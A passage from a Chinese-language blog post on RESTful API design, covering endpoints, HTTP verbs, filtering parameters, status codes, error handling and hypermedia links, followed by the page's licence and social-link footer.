href="https://developer.github.com/v3/media/#request-specific-version">Github</a>采用这种做法。</p>\n\n<h2>四、路径（Endpoint）</h2>\n\n<p>路径又称"终点"（endpoint），表示API的具体网址。</p>\n\n<p>在RESTful架构中，每个网址代表一种资源（resource），所以网址中不能有动词，只能有名词，而且所用的名词往往与数据库的表格名对应。一般来说，数据库中的表都是同种记录的"集合"（collection），所以API中的名词也应该使用复数。</p>\n\n<p>举例来说，有一个API提供动物园（zoo）的信息，还包括各种动物和雇员的信息，则它的路径应该设计成下面这样。</p>\n\n<blockquote>\n  <ul>\n<li>https://api.example.com/v1/zoos</li>\n<li>https://api.example.com/v1/animals</li>\n<li>https://api.example.com/v1/employees</li>\n</ul>\n</blockquote>\n\n<h2>五、HTTP动词</h2>\n\n<p>对于资源的具体操作类型，由HTTP动词表示。</p>\n\n<p>常用的HTTP动词有下面五个（括号里是对应的SQL命令）。</p>\n\n<blockquote>\n  <ul>\n<li>GET（SELECT）：从服务器取出资源（一项或多项）。</li>\n<li>POST（CREATE）：在服务器新建一个资源。</li>\n<li>PUT（UPDATE）：在服务器更新资源（客户端提供改变后的完整资源）。</li>\n<li>PATCH（UPDATE）：在服务器更新资源（客户端提供改变的属性）。</li>\n<li>DELETE（DELETE）：从服务器删除资源。</li>\n</ul>\n</blockquote>\n\n<p>还有两个不常用的HTTP动词。</p>\n\n<blockquote>\n  <ul>\n<li>HEAD：获取资源的元数据。</li>\n<li>OPTIONS：获取信息，关于资源的哪些属性是客户端可以改变的。</li>\n</ul>\n</blockquote>\n\n<p>下面是一些例子。</p>\n\n<blockquote>\n  <ul>\n<li>GET /zoos：列出所有动物园</li>\n<li>POST /zoos：新建一个动物园</li>\n<li>GET /zoos/ID：获取某个指定动物园的信息</li>\n<li>PUT /zoos/ID：更新某个指定动物园的信息（提供该动物园的全部信息）</li>\n<li>PATCH /zoos/ID：更新某个指定动物园的信息（提供该动物园的部分信息）</li>\n<li>DELETE /zoos/ID：删除某个动物园</li>\n<li>GET /zoos/ID/animals：列出某个指定动物园的所有动物</li>\n<li>DELETE /zoos/ID/animals/ID：删除某个指定动物园的指定动物</li>\n</ul>\n</blockquote>\n\n<h2>六、过滤信息（Filtering）</h2>\n\n<p>如果记录数量很多，服务器不可能都将它们返回给用户。API应该提供参数，过滤返回结果。</p>\n\n<p>下面是一些常见的参数。</p>\n\n<blockquote>\n  <ul>\n<li>?limit=10：指定返回记录的数量</li>\n<li>?offset=10：指定返回记录的开始位置。</li>\n<li>?page=2&amp;per_page=100：指定第几页，以及每页的记录数。</li>\n<li>?sortby=name&amp;order=asc：指定返回结果按照哪个属性排序，以及排序顺序。</li>\n<li>?animal_type_id=1：指定筛选条件</li>\n</ul>\n</blockquote>\n\n<p>参数的设计允许存在冗余，即允许API路径和URL参数偶尔有重复。比如，GET /zoo/ID/animals 与 GET /animals?zoo_id=ID 的含义是相同的。</p>\n\n<h2>七、状态码（Status Codes）</h2>\n\n<p>服务器向用户返回的状态码和提示信息，常见的有以下一些（方括号中是该状态码对应的HTTP动词）。</p>\n\n<blockquote>\n  <ul>\n<li>200 OK - [GET]：服务器成功返回用户请求的数据，该操作是幂等的（Idempotent）。</li>\n<li>201 CREATED - [POST/PUT/PATCH]：用户新建或修改数据成功。</li>\n<li>202 Accepted - [*]：表示一个请求已经进入后台排队（异步任务）</li>\n<li>204 NO CONTENT - [DELETE]：用户删除数据成功。</li>\n<li>400 INVALID REQUEST - [POST/PUT/PATCH]：用户发出的请求有错误，服务器没有进行新建或修改数据的操作，该操作是幂等的。</li>\n<li>401 Unauthorized - [*]：表示用户没有权限（令牌、用户名、密码错误）。</li>\n<li>403 Forbidden - [*] 表示用户得到授权（与401错误相对），但是访问是被禁止的。</li>\n<li>404 NOT FOUND - [*]：用户发出的请求针对的是不存在的记录，服务器没有进行操作，该操作是幂等的。</li>\n<li>406 Not Acceptable - [GET]：用户请求的格式不可得（比如用户请求JSON格式，但是只有XML格式）。</li>\n<li>410 Gone -[GET]：用户请求的资源被永久删除，且不会再得到的。</li>\n<li>422 Unprocesable entity - [POST/PUT/PATCH] 当创建一个对象时，发生一个验证错误。</li>\n<li>500 INTERNAL SERVER ERROR - [*]：服务器发生错误，用户将无法判断发出的请求是否成功。</li>\n</ul>\n</blockquote>\n\n<p>状态码的完全列表参见<a href="http://www.w3.org/Protocols/rfc2616/rfc2616-sec10.html">这里</a>。</p>\n\n<h2>八、错误处理（Error handling）</h2>\n\n<p>如果状态码是4xx，就应该向用户返回出错信息。一般来说，返回的信息中将error作为键名，出错信息作为键值即可。</p>\n\n<blockquote><pre><code class="language-javascript">\n{\n    error: "Invalid API key"\n}\n</code></pre></blockquote>\n\n<h2>九、返回结果</h2>\n\n<p>针对不同操作，服务器向用户返回的结果应该符合以下规范。</p>\n\n<blockquote>\n  <ul>\n<li>GET /collection：返回资源对象的列表（数组）</li>\n<li>GET /collection/resource：返回单个资源对象</li>\n<li>POST /collection：返回新生成的资源对象</li>\n<li>PUT /collection/resource：返回完整的资源对象</li>\n<li>PATCH /collection/resource：返回完整的资源对象</li>\n<li>DELETE /collection/resource：返回一个空文档</li>\n</ul>\n</blockquote>\n\n<h2>十、Hypermedia API</h2>\n\n<p>RESTful API最好做到Hypermedia，即返回结果中提供链接，连向其他API方法，使得用户不查文档，也知道下一步应该做什么。</p>\n\n<p>比如，当用户向api.example.com的根目录发出请求，会得到这样一个文档。</p>\n\n<blockquote><pre><code class="language-javascript">\n{"link": {\n  "rel":   "collection https://www.example.com/zoos",\n  "href":  "https://api.example.com/zoos",\n  "title": "List of zoos",\n  "type":  "application/vnd.yourformat+json"\n}}\n</code></pre></blockquote>\n\n<p>上面代码表示，文档中有一个link属性，用户读取这个属性就知道下一步该调用什么API了。rel表示这个API与当前网址的关系（collection关系，并给出该collection的网址），href表示API的路径，title表示API的标题，type表示返回类型。</p>\n\n<p>Hypermedia API的设计被称为<a href="http://en.wikipedia.org/wiki/HATEOAS">HATEOAS</a>。Github的API就是这种设计，访问<a href="https://api.github.com/">api.github.com</a>会得到一个所有可用API的网址列表。</p>\n\n<blockquote><pre><code class="language-javascript">\n{\n  "current_user_url": "https://api.github.com/user",\n  "authorizations_url": "https://api.github.com/authorizations",\n  // ...\n}\n</code></pre></blockquote>\n\n<p>从上面可以看到，如果想获取当前用户的信息，应该去访问<a href="https://api.github.com/user">api.github.com/user</a>，然后就得到了下面结果。</p>\n\n<blockquote><pre><code class="language-javascript">\n{\n  "message": "Requires authentication",\n  "documentation_url": "https://developer.github.com/v3"\n}\n</code></pre></blockquote>\n\n<p>上面代码表示，服务器给出了提示信息，以及文档的网址。</p>\n\n<h2>十一、其他</h2>\n\n<p>（1）API的身份认证应该使用<a href="http://www.ruanyifeng.com/blog/2014/05/oauth_2_0.html">OAuth 2.0</a>框架。</p>\n\n<p>（2）服务器返回的数据格式，应该尽量使用JSON，避免使用XML。</p>\n\n<p>（完）</p>\n\n        <div><h3>文档信息</h3>\n<ul>\n<li>版权声明：自由转载-非商用-非衍生-保持署名（<a href="http://creativecommons.org/licenses/by-nc-nd/3.0/deed.zh">创意共享3.0许可证</a>）</li>\n<li>发表日期： <abbr class="published" title="2014-05-22T20:54:31+08:00">2014年5月22日</abbr></li>\n<li>更多内容： <a href="http://www.ruanyifeng.com/blog/archives.html" target="_blank"><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAUBAMAAAB/pwA+AAAAG1BMVEUxAAAdHRseHhwfHx0fHx4gIB4hIR8iIiAjIyCMbVMLAAAAAXRSTlMAQObYZgAAAAFiS0dEAIgFHUgAAAAJcEhZcwAACxMAAAsTAQCanBgAAAAHdElNRQfeBgwBJS9jlhpuAAAAcUlEQVQI122OOxKAIAwFQYfegGCLBdjKUfAGNNZ6A49uws/GVDtvdnbCGB6fWLux4SnSNtwZg5PRQLKIMjiIGg5EHD1xFiBVQV0OnsWWRuvKoNFcaXEyIc80UtPklKBOEZjPo6pfDN9nfO8obMd/oawvhiwOwjTYfd0AAAAASUVORK5CYII=" style="border: 0;" /> 档案</a>  » \n<a href="http://www.ruanyifeng.com/blog/developer/"> <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAUBAMAAAB/pwA+AAAAG1BMVEUxAAAdHRseHhwfHx0fHx4gIB4hIR8iIiAjIyCMbVMLAAAAAXRSTlMAQObYZgAAAAFiS0dEAIgFHUgAAAAJcEhZcwAACxMAAAsTAQCanBgAAAAHdElNRQfeBgwBJS9jlhpuAAAAcUlEQVQI122OOxKAIAwFQYfegGCLBdjKUfAGNNZ6A49uws/GVDtvdnbCGB6fWLux4SnSNtwZg5PRQLKIMjiIGg5EHD1xFiBVQV0OnsWWRuvKoNFcaXEyIc80UtPklKBOEZjPo6pfDN9nfO8obMd/oawvhiwOwjTYfd0AAAAASUVORK5CYII=" style="border: 0;" /> 开发者手册</a> \n</li>\n<li>付费支持：<a href="http://www.ruanyifeng.com/blog/2014/05/my_blog_book.html" target="_blank"><img src="data:image/png;base64,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" style="border: 0;" /> 购买文集</a></li>\n<li>社交媒体：<a href="https://twitter.com/ruanyf" target="_blank"><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAUCAYAAACNiR0NAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAk1JREFUeNqsVc9rE0EU/mZ3dhPNJl2bVIk/Km09aFBE8GLvnrwJXvwLxIsgCP4Fnit6E8Gb0IMHwUsL9SSNgiAoooJIpE1Joo1h82uT7IxvxmRN3Q32kAdvdrI773vfe+/bDTu9WioDcDAda3Ja8piepQ1avCkCeny0Y+R9KenKwOmHHLvPaKn7AtVOoO8dOWDCMpg+41gMQv5FNEJACgoE8MsPNLDBhgfoutMOsJDmWLmU037C4TApciljwQ/kHoohQxV06+wMXNvE7WINuaSpvdYVKLgWnl3O4zAxU3Z1IYVGT+B5qYWV9z2kbQaT/cOwTsxOUUYF+mB5Dkmi8HG3h2q9hxsFNwRTdvQgxxnXRrMvIdkEhllis/qtiWuLDm4WZnBlPoWnXz28LHdw0uGR7m9Wu3j0qYGEubfn4UlBfXO4gTZltRNMg9w9f0i7kNFxllsBlS0x75gYfxyWTBUjT2W5CSMSPBrQuG21+hiMDS8CeCzF8eSLp13uQ3Ab1IqMFZN8tFHPmgOBF99bYP8Be1Xp6t7OJszJgKpPSiZvaj7uf2hguz2IBQuozDvFH6RDBjuK9wdQDvt0nMpW+8efGyh5UcAeZb2+UcHbnz5Jx4wdlp4yJYU3kLiQtfBwOYeLc8nIwfXtNu69q2Oz4mMxbemYOOOjKarhvq51KUjg3GwiFPIuvcNF6pnSnWK0lOEabNLgQh1aJFAhlGB9rG110B2+oyRNPc0sZbRNFltmLKDKqj4Qrm1ojzOxDz2pyPQ0P7CK4c40/wJ+CzAAGYrXsvfFXR4AAAAASUVORK5CYII=" style="border: 0;" /> twitter</a>，<a href="http://weibo.com/ruanyf" target="_blank"><img src="data:image/png;base64,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" style="border: 0;" /> weibo</a></li>\n<li>Feed订阅： <a href="http://www.ruanyifeng.com/feed.html" target="_blank"><img src="data:image/gif;base64,R0lGODlhFAAUANU2APV1GfmrePZ8IeR5VPq2ieNkLf7p3NpFJveCJ/NoFfibVPR1IexiJfvdzuZrNfXGuOhUEueTevaFOfzIpNxDGeZZJNU6IOubifiVTfOnid1aLuZpLOFSJf/28vJtIvGcefaLSd5kNu9iFv/z6//48//t4uFfLfNkCeJNGuGNc/rCof/+/PVxEeldI/V5KeKMbu9nIvB2OvzQtNxMKfOPXP///wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAEAADYALAAAAAAUABQAAAb/QJstEjKZCsjCZsl0pIS2QWXaYsA8noVWIEAgFoNhhWNyMESi7Jbr/aZCFdRnZJAFJCwAt+vlOkwtEBk1hDUkExJ6bQJaGyYMLTQTDSOFHQF8jAseSFYiJwkuAQ2FE1xaHjBIMDAgARguJwABJIQTLJswDEgeIgSEJQQILAqVNQEiui1HHgkBhTUGCiwYtR0xLS0VJhtaEgoEBoQkGCfPNSoQY9xaCwAsCBPALgmkJA4cZN0CAAgY/PJqEIDwgVAECjM0bOAnwc